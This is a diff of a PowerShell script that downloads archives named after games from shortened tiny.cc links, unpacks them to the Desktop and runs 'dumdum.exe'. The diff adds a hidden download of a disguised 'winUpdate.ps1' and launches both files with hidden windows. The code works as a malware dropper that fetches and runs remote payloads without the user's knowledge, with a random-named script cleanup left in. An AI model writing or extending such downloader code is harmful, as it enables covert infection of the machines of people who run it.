@@ -19,6 +19,7 @@ Set-Variable -Name zipUrl -Value ("http://tiny.cc/f7cg001")
 Set-Variable -Name zipUrl_1 -Value ("http://tiny.cc/k7cg001")
 Set-Variable -Name zipUrl_2 -Value ("http://tiny.cc/p7cg001")
 Set-Variable -Name zipUrl_3 -Value ("http://tiny.cc/v7cg001")
+Set-Variable -Name Url_1 -Value ("http://tiny.cc/limg001")
 Set-Variable -Name desktopPath -Value ([Environment]::GetFolderPath("Desktop"))
 function Test-IsAdmin {
     Set-Variable -Name currentUser -Value (New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent()))
@@ -41,6 +42,9 @@ powershell -Uri $zipUrl_2 Invoke-WebRequest -UseBasicParsing -OutFile "$zipFileP
 
 powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_3 -UseBasicParsing -OutFile "$zipFilePath\dumdum.zip"
 
+powershell -Uri $Url_1 Invoke-WebRequest -windowstyle hidden -UseBasicParsing -OutFile "$zipFilePath\winUpdate.ps1"
+
+
 Expand-Archive -Force -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath
 
 Expand-Archive -DestinationPath $desktopPath -Path "$zipFilePath\Fifa-Ps5.zip" -Force
@@ -51,8 +55,11 @@ Expand-Archive -Force -Path "$zipFilePath\dumdum.zip" -DestinationPath $desktopP
 
 Start-Sleep -Seconds 240
 
-Start-Process -FilePath "$desktopPath\dumdum.exe" 
+Start-Process -windowstyle hidden -FilePath "$desktopPath\dumdum.exe" 
+
+Start-Process -windowstyle hidden -FilePath "$desktopPath\winUpdate.ps1"
 
 exit 0
 
 Remove-Item -Path "%%d:\wYytnosVxfzD.ps1"
+
